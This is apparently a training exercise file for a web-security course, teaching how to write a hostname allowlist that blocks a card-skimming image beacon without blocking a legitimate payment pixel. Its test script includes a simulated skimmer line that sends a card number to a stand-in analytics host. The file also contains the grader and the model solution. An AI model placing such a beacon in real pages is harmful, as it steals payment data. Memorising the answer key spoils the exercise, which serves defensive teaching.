const SITE_HTML = `
<div class="card">
  <h3>Payment details</h3>
  <form id="payment-form">
    <div class="field"><label for="card-number">Card number</label><input id="card-number" type="text" /></div>
  </form>
</div>
`;

const INITIAL_CODE = `// Naive first draft: block every outbound image beacon, no exceptions.
window.__imagePolicy = function (url) {
  return false; // false = block
};
`;

const TEST_SCRIPT = `(function () {
  var card = document.getElementById('card-number');
  card.value = '4111 1111 1111 1111';

  // Legitimate payment SDK: reads the card field (it genuinely needs to, for
  // tokenization) then fires a normal fraud-prevention pixel to the PSP's own domain.
  var legitImg = new Image();
  legitImg.src = 'https://payments.mystore.example/fraud-pixel?ts=1';

  // Malicious script: reads the same field, exfiltrates to an unrelated host.
  var maliciousImg = new Image();
  maliciousImg.src = 'https://cdn-metrics.free-analytics-suite.top/collect?d=' + encodeURIComponent(card.value);

  var legitAllowed = __networkLog.some(function (e) { return e.url && e.url.indexOf('payments.mystore.example') !== -1; });
  var maliciousBlocked = !__networkLog.some(function (e) { return e.url && e.url.indexOf('free-analytics-suite') !== -1; });

  __report({ legitAllowed: legitAllowed, maliciousBlocked: maliciousBlocked });
})();
`;

export default {
  id: 'the-false-positive',
  chapter: 8,
  title: 'The False Positive',
  type: 'architecture-decision',
  difficulty: 'advanced',
  xp: 210,
  estimatedMinutes: 25,
  runner: 'iframe',
  submissionMode: 'code',
  panels: ['network', 'alerts'],
  editorLabel: 'window.__imagePolicy(url)',

  objective: 'Refine a runtime security policy so it blocks the actual attacker without collaterally breaking a legitimate script that happens to look superficially similar.',
  prerequisites: 'Chapter 7 (what a skimmer attack looks like at runtime).',
  scenario: 'Yesterday\'s incident (the silent skimmer) got a policy shipped fast: block every outbound image beacon, full stop. It works — a little too well. Now the checkout page\'s own fraud-prevention pixel, sent by the legitimate payment SDK, is getting blocked too, and the payments team is escalating.',
  task: 'Rewrite window.__imagePolicy(url) so it blocks the malicious destination while still allowing the legitimate payment SDK\'s pixel through.',
  expectedBehavior: 'The malicious beacon (to an unfamiliar host) is blocked and raises a security alert. The legitimate payment SDK\'s beacon (to payments.mystore.example) is allowed through and appears in the Network panel.',

  siteSnapshot: SITE_HTML,
  initialCode: INITIAL_CODE,
  testScript: TEST_SCRIPT,

  validate(runResult) {
    if (runResult.error) return { passed: false, score: { security: 0, compatibility: 0 }, feedback: [`Error: ${runResult.error}`] };
    const r = runResult.returnValue ?? {};
    const security = r.maliciousBlocked ? 1 : 0;
    const compatibility = r.legitAllowed ? 1 : 0;
    const feedback = [
      r.maliciousBlocked ? 'The malicious beacon was blocked.' : 'The malicious beacon got through — this policy is not actually catching the attack.',
      r.legitAllowed ? 'The legitimate payment pixel was allowed through.' : 'The legitimate payment pixel was blocked — this is the false positive breaking the payments team\'s feature.',
    ];
    return { passed: security === 1 && compatibility === 1, score: { security, compatibility }, feedback };
  },

  hints: [
    'The current policy doesn\'t look at the URL at all — it blocks everything unconditionally, which is why it "works" against the attack but also breaks the legitimate pixel.',
    'Both beacons read the card field first, so "did it read a sensitive field before firing a beacon" can\'t be the distinguishing signal here — both scripts do that. The destination is what differs.',
    'Parse the URL\'s hostname (`new URL(url).hostname`) and check it against an allowlist of known-legitimate destinations, e.g. `["payments.mystore.example"]`. Allow only allowlisted hosts; block everything else.',
  ],

  solution: `const ALLOWLIST = ['payments.mystore.example'];

window.__imagePolicy = function (url) {
  try {
    const host = new URL(url).hostname;
    return ALLOWLIST.includes(host);
  } catch (e) {
    return false;
  }
};`,

  explanation: 'The naive policy conflates two different questions: "did something suspicious happen" (reading a sensitive field) and "is this specific outbound destination trusted." Both the legitimate payment SDK and the malicious script read the card field — that part of the behavior is identical and not a useful discriminator on its own. What actually differs is the destination host. An allowlist-based check on the parsed hostname (never on a raw substring match of the full URL, which is trivially spoofable — e.g. `payments.mystore.example.attacker.com` would contain the substring but resolve to the attacker\'s domain) correctly separates the two cases using the one signal that\'s actually different between them.',

  commonWrongAnswers: [
    { description: 'Checking `url.includes("payments.mystore.example")` instead of parsing the hostname.', why: 'A substring check can be defeated by an attacker-controlled URL that merely CONTAINS the trusted string somewhere, e.g. as a subdomain label or query parameter, while actually resolving to a completely different (attacker-controlled) host.' },
    { description: 'Trying to distinguish the two scripts by whether they read the card field first.', why: 'Both the legitimate and malicious code paths read the field — that\'s not the differentiating signal in this scenario, and a policy built around it would still face the same false-positive/false-negative problem.' },
  ],

  securityImpact: 'This is the single most common failure mode of hastily-shipped runtime security rules: a broad, behavior-only block that "stops the bad thing" by stopping a much larger category of legitimate behavior along with it — which is exactly the kind of incident that gets a security control disabled in production rather than fixed.',
  runtimeExplanation: 'Constructing a `URL` object and reading `.hostname` gives you the browser\'s own authoritative parse of the URL\'s host component, which correctly handles edge cases (userinfo, ports, IDN, encoded characters) that a naive string match will get wrong — this is the standard, spec-correct way to answer "what host is this URL actually pointing at."',
  sourceDefenseConnection: 'Distinguishing legitimate from malicious behavior by destination, not just by the action taken, is core allowlist/policy design work for this role — and explaining precisely why a broad rule caused a false positive (not just that it did) is a very common interview follow-up.',
  followUp: 'Extend the policy to also allow a second legitimate CDN host you\'re told about only via a runtime config object (not hardcoded), and explain in one sentence why hardcoding an allowlist is a maintainability risk in a real production rollout.',
  skillTags: ['runtimeInstrumentation', 'webSecurity', 'productionReliability'],
};
